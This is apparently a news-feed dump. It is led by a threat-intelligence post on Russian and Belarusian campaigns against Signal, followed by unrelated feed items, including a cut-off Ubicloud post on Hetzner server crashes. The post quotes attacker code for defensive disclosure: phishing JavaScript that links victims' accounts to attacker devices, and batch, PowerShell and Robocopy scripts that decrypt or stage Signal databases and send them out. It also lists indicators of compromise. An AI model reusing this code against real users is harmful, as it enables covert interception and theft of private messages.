<p><span><span>We are grateful to the team at Signal for their close partnership in investigating this activity. The latest Signal releases on </span><a href="https://github.com/signalapp/Signal-Android/commit/112874c08019a40b6f8f1dbbf84eb0ab4d796582" rel="noopener" target="_blank"><span>Android</span></a><span> and </span><a href="https://github.com/signalapp/Signal-iOS/commit/498b97033254c514404345efc1d4c29c1b076f6c" rel="noopener" target="_blank"><span>iOS</span></a><span> contain hardened features designed to help protect against similar phishing campaigns in the future. </span><a href="https://support.signal.org/hc/en-us/articles/360007059212-How-do-I-ensure-Signal-is-up-to-date" rel="noopener" target="_blank"><span>Update</span></a><span> to the latest version to enable these features.</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Phishing Campaigns Abusing Signal's "Linked Devices" Feature</span></h2>
<p><span>The most novel and widely used technique underpinning Russian-aligned attempts to compromise Signal accounts is the abuse of the app's legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360007320551-Linked-Devices" rel="noopener" target="_blank"><span>linked devices</span></a><span>" feature that enables Signal to be used on multiple devices concurrently. Because linking an additional device typically requires scanning a quick-response (QR) code, threat actors have resorted to crafting malicious QR codes that, when scanned, will link a victim's account to an actor-controlled Signal instance. If successful, future messages will be delivered synchronously to both the victim and the threat actor in real-time, providing a persistent means to eavesdrop on the victim's secure conversations without the need for full-device compromise.</span></p>
<ul>
<li>
<p><span>In remote phishing operations observed to date, malicious QR codes have frequently been masked as legitimate Signal resources, such as group invites, security alerts, or as legitimate device pairing instructions from the Signal website.</span></p>
</li>
<li>
<p><span>In more tailored remote phishing operations, malicious device-linking QR codes have been embedded in phishing pages crafted to appear as specialized applications used by the Ukrainian military.</span></p>
</li>
<li>
<p><span>Beyond remote phishing and malware delivery operations, we have also seen malicious QR codes being used in close-access operations. </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm"><span>APT44</span></a><span> (aka Sandworm or Seashell Blizzard, a threat actor attributed by </span><a href="https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and" rel="noopener" target="_blank"><span>multiple</span></a><span> governments to the Main Centre for Special Technologies (GTsST) within Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GU), known commonly as the GRU) has worked to enable forward-deployed Russian military forces to link Signal accounts on devices captured on the battlefield back to actor-controlled infrastructure for follow-on exploitation.</span></p>
</li>
</ul>
<p><span>Notably, this device-linking concept of operations has proven to be a low-signature form of initial access due to the lack of centralized, technology-driven detections and defenses that can be used to monitor for account compromise via newly linked devices; when successful, there is a high risk that a compromise can go unnoticed for extended periods of time.</span></p>
<h2><span>UNC5792: Modified Signal Group Invites</span></h2>
<p><span>To compromise Signal accounts using the device-linking feature, one suspected Russian espionage cluster tracked as UNC5792 (which partially overlaps with CERT-UA's </span><a href="https://cert.gov.ua/article/6278735" rel="noopener" target="_blank"><span>UAC-0195</span></a><span>) has altered legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360051086971-Group-Link-or-QR-code" rel="noopener" target="_blank"><span>group invite</span></a><span>" pages for delivery in phishing campaigns, replacing the expected redirection to a Signal group with a redirection to a malicious URL crafted to link an actor-controlled device to the victim's Signal account.</span></p>
<ul>
<li>
<p><span>In these operations, UNC5792 has hosted modified Signal group invitations on actor-controlled infrastructure designed to appear identical to a legitimate Signal group invite.</span></p>
</li>
<li>
<p><span>In each of the fake group invites, JavaScript code that typically redirects the user to join a Signal group has been replaced by a malicious block containing the Uniform Resource Identifier (URI) used by Signal to link a new device to Signal (i.e., "sgnl://linkdevice?uuid="), tricking victims into linking their Signal accounts to a device controlled by UNC5792.</span></p>
</li>
</ul></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 1: Example modified Signal group invite hosted on UNC5792-controlled domain "signal-groups[.]tech"</p></span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>function doRedirect() {
if (window.location.hash) {
var redirect = "sgnl://signal.group/" + window.location.hash
document.getElementById('go-to-group').href = redirect
window.location = redirect
} else {
document.getElementById('join-button').innerHTML = "No group found."
window.onload = doRedirect</code></pre>
<p><span>Figure 2: Typical legitimate group invite code for redirection to a Signal group</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>function doRedirect() {
var redirect = 'sgnl://linkdevice
uuid=h_8WKmzwam_jtUeoD_NQyg%3D%3D
pub_key=Ba0212mHrGIy4t%2FzCCkKkRKwiS0osyeLF4j1v8DKn%2Fg%2B'
//redirect=encodeURIComponent(redirect)
document.getElementById('go-to-group').href = redirect
window.location = redirect
window.onload = doRedirect</code></pre>
<p><span><span>Figure 3: Example of UNC5792 modified redirect code used to link the victim's device to an actor-controlled Signal instance</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>UNC4221: Custom-Developed Signal Phishing Kit</span></h2>
<p><span>UNC4221 (tracked by CERT-UA as </span><a href="https://cert.gov.ua/article/6281632" rel="noopener" target="_blank"><span>UAC-0185</span></a><span>) is an additional Russia-linked threat actor who has actively targeted Signal accounts used by Ukrainian military personnel. The group operates a tailored Signal phishing kit designed to mimic components of the </span><a href="https://united24media.com/war-in-ukraine/ukraines-secret-weapon-kropyva-software-4026#:~:text=Kropyva's%20impact&amp;text=Amongst%20the%20Ukrainian%20Armed%20Forces,applications%20across%20Ukraine's%20armed%20forces." rel="noopener" target="_blank"><span>Kropyva</span></a><span> application used by the Armed Forces of Ukraine for artillery guidance. Similar to the social engineering approach used by UNC5792, UNC4221 has also attempted to mask its device-linking functionality as an invite to a Signal group from a trusted contact. Different variations of this phishing kit have been observed, including:</span></p>
<ul>
<li>
<p><span>Phishing websites that redirect victims to secondary phishing infrastructure masquerading as legitimate device-linking instructions provisioned by Signal (Figure 4)</span></p>
</li>
<li>
<p><span>Phishing websites with the malicious device-linking QR code directly embedded into the primary Kropyva-themed phishing kit (Figure 5)</span></p>
</li>
<li>
<p><span>In earlier operations in 2022, UNC4221 phishing pages were crafted to appear as a legitimate security alert from Signal (Figure 6)</span></p>
</li>
</ul></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-signal.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-signal.max-1200x1200.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 4: Malicious device-linking QR code hosted on UNC4221-controlled domain "signal-confirm[.]site"</p></span></p></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 5: UNC4221 phishing page mimicking the networking component of Kropyva hosted at "teneta.add-group[.]site". The page invites the user to "Sign in to Signal" (Ukrainian: "Авторизуватись у Signal"), which in turn displays a QR code linked to an UNC4221-controlled Signal instance.</p></span></p></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 6: Phishing page crafted to appear as a Signal security alert hosted on UNC4221-controlled domain signal-protect[.]host</p></span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>Notably, as a core component of its Signal targeting, UNC4221 has also used a lightweight JavaScript payload tracked as PINPOINT to collect basic user information and geolocation data using the browser's GeoLocation API. In general, we expect to see secure messages and location data to frequently feature as joint targets in future operations of this nature, particularly in the context of targeted surveillance operations or support to conventional military operations.</span></p>
<h2><span>Wider Russian and Belarusian Efforts to Steal Messages From Signal</span></h2>
<p><span>Beyond targeted efforts to link additional actor-controlled devices to victim Signal accounts, multiple known and established regional threat actors have also been observed operating capabilities designed to steal Signal database files from Android and Windows devices.</span></p>
<ul>
<li>
<p><span>APT44 has been observed operating WAVESIGN, a lightweight Windows Batch script, to periodically query Signal messages from a victim's Signal database and exfiltrate those most recent messages using Rclone (Figure 7).</span></p>
</li>
<li>
<p><span>As reported in 2023 by the </span><a href="https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system" rel="noopener" target="_blank"><span>Security Service of Ukraine</span></a><span> (SSU) and the UK's </span><a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/infamous-chisel/NCSC-MAR-Infamous-Chisel.pdf" rel="noopener" target="_blank"><span>National Cyber Security Centre</span></a><span> (NCSC), the Android malware tracked as Infamous Chisel and attributed by the respective organizations to Sandworm, is designed to recursively search for a list of file extensions including the local database for a series of messaging applications, including Signal, on Android devices.</span></p>
</li>
<li>
<p><span>Turla, a Russian threat actor attributed by the </span><a href="https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled" rel="noopener" target="_blank"><span>United States</span></a><span> and </span><a href="https://www.gov.uk/government/publications/russias-fsb-malign-cyber-activity-factsheet/russias-fsb-malign-activity-factsheet" rel="noopener" target="_blank"><span>United Kingdom</span></a><span> to Center 16 of the Federal Security Service (FSB) of the Russian Federation, has also operated a lightweight PowerShell script in post-compromise contexts to stage Signal Desktop messages for exfiltration (Figure 8).</span></p>
</li>
<li>
<p><span>Extending beyond Russia, Belarus-linked UNC1151 has used the command-line utility Robocopy to stage the contents of file directories used by Signal Desktop to store messages and attachments for later exfiltration (Figure 9).</span></p>
</li>
</ul></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>if %proflag%==1 (
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    copy /y %new% C:\ProgramData\Signal\Storage\Signal\sqlorig\db.sqlite
    C:\ProgramData\Signal\Storage\rc.exe copy -P -I --log-file=C:\ProgramData\Signal\Storage\rclog.txt --log-level INFO C:\ProgramData\Signal\Storage\Signal\sqlorig si:SignalFresh/sqlorig
    del C:\ProgramData\Signal\Storage\Signal\log*
    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql
) ELSE (

    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%old_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%new_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqldiff.exe --primarykey --vtab %old_dec% %new_dec% &gt; %diff_name%
    del /s %old_dec% %new_dec%

    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql

    powershell -Command "move C:\ProgramData\Signal\Storage\log.tmp C:\ProgramData\Signal\Storage\Signal\log$(Get-Date -f """ddMMyyyyHHmmss""").tmp"
)</code></pre>
<p><span><span>Figure 7:</span><strong> </strong><span>Code snippet from WAVESIGN used by APT44 to exfiltrate Signal messages</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>$TempPath = $env:tmp
$TempPath = $env:temp

$ComputerName = $env:computername
$DFSRoot = "\\redacted"
$RRoot = $DFSRoot + "resource\"

$frand = Get-Random -Minimum 1 -Maximum 10000

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append


$file1 = $ComputerName + "_" + $frand + "sig.zip"
$zipfile = $TempPath + "\" + $file1
$resfile = $RRoot + $file1
Compress-Archive -Path "C:\Users\..\AppData\Roaming\SIGNAL\config.json" -DestinationPath $zipfile
Copy-Item -Path $zipfile -Destination $resfile -Force
Remove-Item -Path $zipfile -Force</code></pre>
<p><span><span>Figure 8:</span><strong> </strong><span>PowerShell script used by Turla to exfiltrate Signal messages</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>C:\Windows\system32\cmd.exe /C cd %appdata% &amp;&amp; robocopy 
"%userprofile%\AppData\Roaming\Signal" C:\Users\Public\data\signa /S</code></pre>
<p><span><span>Figure 9:</span><strong> </strong><span>Robocopy command used by UNC1151 to stage Signal file directories for exfiltration</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Outlook and Implications</span></h2>
<p><span>The operational emphasis on Signal from multiple threat actors in recent months serves as an important warning for the growing threat to secure messaging applications that is certain to intensify in the near-term. When placed in a wider context with other trends in the threat landscape, such as the growing commercial spyware industry and the surge of mobile malware variants being leveraged in active conflict zones, there appears to be a clear and growing demand for offensive cyber capabilities that can be used to monitor the sensitive communications of individuals who rely on secure messaging applications to safeguard their online activity.</span></p>
<p><span>As reflected in wide ranging efforts to compromise Signal accounts, this threat to secure messaging applications is not limited to remote cyber operations such as phishing and malware delivery, but also critically includes close-access operations where a threat actor can secure brief access to a target's unlocked device. Equally important, this threat is not only limited to Signal, but also extends to other widely used messaging platforms, including WhatsApp and Telegram, which have likewise factored into the targeting priorities of several of the aforementioned Russia-aligned groups in recent months. For an example of this wider targeting interest, see Microsoft Threat Intelligence's </span><a href="https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/" rel="noopener" target="_blank"><span>recent blog post</span></a><span> on a COLDRIVER (aka UNC4057 and Star Blizzard) campaign attempting to abuse the linked device feature to compromise WhatsApp accounts.&nbsp;&nbsp;</span></p>
<p><span>Potential targets of government-backed intrusion activity targeting their personal devices should adopt practices to help safeguard themselves, including:</span></p>
<ul>
<li>
<p><span>Enable </span><a href="https://support.google.com/android/answer/9079129?hl=en" rel="noopener" target="_blank"><span>screen lock</span></a><span> on all mobile devices using a long, complex password with a mix of uppercase and lowercase letters, numbers, and symbols. Android supports alphanumeric passwords, which offer significantly more security than numeric-only PINs or patterns.</span></p>
</li>
<li>
<p><span>Install operating system updates as soon as possible and always use the latest version of Signal and other messaging apps.</span></p>
</li>
<li>
<p><span>Ensure </span><a href="https://support.google.com/googleplay/answer/2812853?hl=en" rel="noopener" target="_blank"><span>Google Play Protect</span></a><span> is enabled, which is on by default on Android devices with Google Play Services. Google Play Protect checks your apps and devices for harmful behavior and can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.</span></p>
</li>
<li>
<p><span>Audit linked devices regularly for unauthorized devices by navigating to the "Linked devices" section in the application's settings.</span></p>
</li>
<li>
<p><span>Exercise caution when interacting with QR codes and web resources purporting to be software updates, group invites, or other notifications that appear legitimate and urge immediate action.</span></p>
</li>
<li>
<p><span>If available, use two-factor authentication such as fingerprint, facial recognition, a security key, or a one-time code to verify when your account is logged into or linked to a new device.</span></p>
</li>
<li>
<p><span>iPhone users concerned about targeted surveillance or espionage activity should consider enabling </span><a href="https://support.apple.com/en-ca/guide/iphone/iph049680987/ios" rel="noopener" target="_blank"><span>Lockdown Mode</span></a><span> to reduce their attack surface.</span></p>
</li>
</ul></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Indicators of Compromise</span></h2>
<p><span>To assist organizations hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a <a href="https://www.virustotal.com/gui/collection/b9885b58701486f26d370ea939aaffc263d5c4053696bfe82911247ef43da85a" rel="noopener" target="_blank">GTI Collection</a> for registered users.</span></p>
<p><span>See Table 1 for a sample of relevant indicators of compromise.</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><div>
<div><table><colgroup><col><col><col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Actor</strong></p>
</td>
<td>
<p><strong>Indicator of Compromise</strong></p>
</td>
<td>
<p><strong>Context&nbsp;</strong></p>
</td>
</tr>
<tr>
<td rowspan="9">
<p><span>UNC5792</span></p>
</td>
<td>
<p><span>e078778b62796bab2d7ab2b04d6b01bf</span></p>
</td>
<td>
<p><span>Example of altered group invite HTML code&nbsp;</span></p>
</td>
</tr>
<tr>
<td rowspan="8">
<p><span>add-signal-group[.]com</span></p>
<p><span>add-signal-groups[.]com</span></p>
<p><span>group-signal[.]com</span></p>
<p><span>groups-signal[.]site</span></p>
<p><span>signal-device-off[.]online</span></p>
<p><span>signal-group-add[.]com</span></p>
<p><span>signal-group[.]site</span></p>
<p><span>signal-group[.]tech</span></p>
<p><span>signal-groups-add[.]com</span></p>
<p><span>signal-groups[.]site</span></p>
<p><span>signal-groups[.]tech</span></p>
<p><span>signal-security[.]online</span></p>
<p><span>signal-security[.]site</span></p>
<p><span>signalgroup[.]site</span></p>
<p><span>signals-group[.]com</span></p>
</td>
<td rowspan="8">
<p><span>Fake group invite phishing pages</span></p>
</td>
</tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr>
<td rowspan="5">
<p><span>UNC4221</span></p>
</td>
<td rowspan="2">
<p><span>signal-confirm[.]site</span></p>
<p><span>confirm-signal[.]site</span></p>
</td>
<td rowspan="2">
<p><span>Device-linking instructions phishing page</span></p>
</td>
</tr>
<tr></tr>
<tr>
<td>
<p><span>signal-protect[.]host</span></p>
</td>
<td>
<p><span>Fake Signal security alert&nbsp;</span></p>
</td>
</tr>
<tr>
<td rowspan="2">
<p><span>teneta.join-group[.]online</span></p>
<p><span>teneta.add-group[.]site</span></p>
<p><span>group-teneta[.]online</span></p>
<p><span>helperanalytics[.]ru</span></p>
<p><span>group-teneta[.]online</span></p>
<p><span>teneta[.]group</span></p>
<p><span>group.kropyva[.]site</span></p>
</td>
<td rowspan="2">
<p><span>Fake Kropyva group invites&nbsp;</span></p>
</td>
</tr>
<tr></tr>
<tr>
<td rowspan="4">
<p><span>APT44</span></p>
</td>
<td>
<p><span>150.107.31[.]194:18000</span></p>
</td>
<td>
<p><span>Dynamically generated device-linking QR code provisioned by APT44</span></p>
</td>
</tr>
<tr>
<td rowspan="3">
<p><span>a97a28276e4f88134561d938f60db495</span></p>
<p><span>b379d8f583112cad3cf60f95ab3a67fd</span></p>
<p><span>b27ff24870d93d651ee1d8e06276fa98</span></p>
</td>
<td rowspan="3">
<p><span>WAVESIGN batch scripts&nbsp;</span></p>
</td>
</tr>
<tr></tr>
<tr></tr>
</tbody>
</table></div>
<p><span><span>Table 1: Relevant indicators of compromise</span></span></p></div></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>See Table 2 for a summary of the different actors, tactics, and techniques used by Russia and Belarus state-aligned threat actors to target Signal messages.</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><div><table><colgroup><col><col><col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Threat Actor&nbsp;</strong></p>
</td>
<td>
<p><strong>Tactic&nbsp;</strong></p>
</td>
<td>
<p><strong>Technique</strong></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC5792</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Remote phishing operations using fake group invites to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC4221</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Remote phishing operations using fake military web applications and security alerts to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td rowspan="3">
<p><span>APT44</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Close-access physical device exploitation to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Signal Android database theft</span></p>
</td>
<td>
<p><span>Android malware (</span><a href="https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system" rel="noopener" target="_blank"><span>Infamous Chisel</span></a><span>) tailored to exfiltrate Signal database files</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Windows Batch script tailored to periodically exfiltrate recent Signal messages via Rclone</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Turla</span></p>
</td>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Post-compromise activity in Windows environments</span></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC1151</span></p>
</td>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Use of Robocopy to stage Signal Desktop file directories for exfiltration</span></p>
</td>
</tr>
</tbody>
</table></div>
<p><span>Table 2: Summary of observed threat activity targeting Signal messages</span></p></span></section><section><span>Posted in</span><ul><li><a href="https://cloud.google.com/blog/topics/threat-intelligence" track-metadata-position="body" track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence" track-metadata-module="tag list" track-metadata-module_headline="posted in">Threat Intelligence</a></li></ul></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Doge Claimed It Saved $8B in One Contract. It Was $8M (165 pts)]]></title>
            <link>https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html</link>
            <guid>43101757</guid>
            <pubDate>Wed, 19 Feb 2025 13:12:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html">https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html</a>, See on <a href="https://news.ycombinator.com/item?id=43101757">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Debugging Hetzner: Uncovering failures with powerstat, sensors, and dmidecode (216 pts)]]></title>
            <link>https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode</link>
            <guid>43101430</guid>
            <pubDate>Wed, 19 Feb 2025 12:40:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode">https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode</a>, See on <a href="https://news.ycombinator.com/item?id=43101430">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" data-doc-height="1" role="banner"><div><p>EuroGPT Enterprise is open source, runs in Europe, and keeps your data private. <a href="https://www.ubicloud.com/use-cases/eurogpt-enterprise">Try it now</a></p></div><div><p><a href="https://www.ubicloud.com/"><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/64fe48116c52fe1a51e17279_ubicolud%20logo.png" loading="lazy" alt=""></a></p></div></div><div id="w-node-decdb48f-56e8-4c35-c577-932285e9b439-0c072a00"><p>February 17, 2025 · 5 min read</p><div><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak.jpg" loading="lazy" sizes="40px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak-p-500.jpg 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak.jpg 512w" alt="Burak Yucesoy"></p><div><p>Burak Yucesoy</p><p>Principal Software Engineer</p></div></div><div><p>At Ubicloud, we build software that turns bare metal providers into cloud platforms. One of the providers we like is Hetzner because of their affordable and reliable servers.</p><p>About a year ago, Hetzner launched the AX162 server line. It offers better performance and a lower price than its predecessor, AX161. We were very excited to adopt it, but we soon encountered serious reliability issues. We observed that the new servers were 16 times more likely to crash. After months of debugging and working with Hetzner, the solution only came after several hardware updates. Although the journey was painful, we learned a lot from it and wanted to share our experience.</p></div><div id="some-terminology"><h3>What Happened?</h3><div><p>Three weeks after purchasing our first AX162 server, one of the servers crashed. We checked the system logs and found NULL bytes. These usually mean there was an abrupt failure, like a power loss, which stopped the system from finishing its writing process. Hetzner performed a hardware check but found nothing unusual. A week later, we experienced another crash, followed by several more over the next few days.</p><p>In the days that followed, the crash frequency increased. For each crash, Hetzner checked the hardware. Sometimes, they found a defect and replaced the server. Other times, they found nothing unusual. We contacted Hetzner about the frequent crashes, but it was hard to find a clear cause.</p><p>At this point, we observed a few interesting patterns:</p></div><ul role="list"><li>All crashes occurred on AX162 servers.</li><li><p>There were two types of crashes:</p><ul role="list"><li>The server comes back online after a manual restart.</li><li>The server wouldn't respond to restart requests or diagnostic codes sent by Hetzner engineers. Hetzner would replace the server in these cases.</li></ul></li><li>The servers usually run smoothly for an extended period. However, once a server experiences its first crash, further crashes become more likely. After the server experiences the first type of crash several times, it would eventually have the second type of crash and be replaced.</li></ul></div><div><h3 id="Red-Hat-Reference-Architecture">Initial Investigations</h3><p>We started testing different ideas to find out what caused the crashes.</p><div><h4>System Load</h4><p>We considered the possibility of increased load on the machine causing issues. The AX162 machines come with 96 vCPUs, and we had workloads that utilized all of them at the same time. Consistent high load, for example, could lead to increased temperatures and unexpected issues. However, when we reviewed the load levels at the times of crashes, we found several instances where crashes occurred even under low or no load.</p></div><div><h4>Temperature</h4><p>We wanted to check if there is a correlation between high temperatures and crashes. It is possible to collect the temperature of various components in the system with sensors command.</p><div><pre><code>$&gt; sensors
coretemp-isa-0000
Adapter: ISA adapter
Package id 0:  +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 0:        +45.0°C  (high = +100.0°C, crit = +100.0°C)
Core 4:        +46.0°C  (high = +100.0°C, crit = +100.0°C)
Core 8:        +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 9:        +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 10:       +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 11:       +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 12:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 13:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 14:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 15:       +49.0°C  (high = +100.0°C, crit = +100.0°C)</code></pre></div><p>We wrote a simple cron job to collect temperature data. When the servers crashed again, we checked the data. The temperature levels were not significantly higher than average at the time of the crashes.</p></div><div><h4>Faulty Components</h4><p>Commands like <span>lshw</span> and <span>dmidecode</span> are useful to gather information regarding hardware parts, including model and serial numbers.</p><div><pre><code>$&gt; dmidecode -t 2
# dmidecode 3.3
Getting SMBIOS data from sysfs.
SMBIOS 3.3.0 present.
Handle 0x0200, DMI type 2, 8 bytes
Base Board Information
        Manufacturer: Dell Inc.
        Product Name: 0H3K7P
        Version: A08
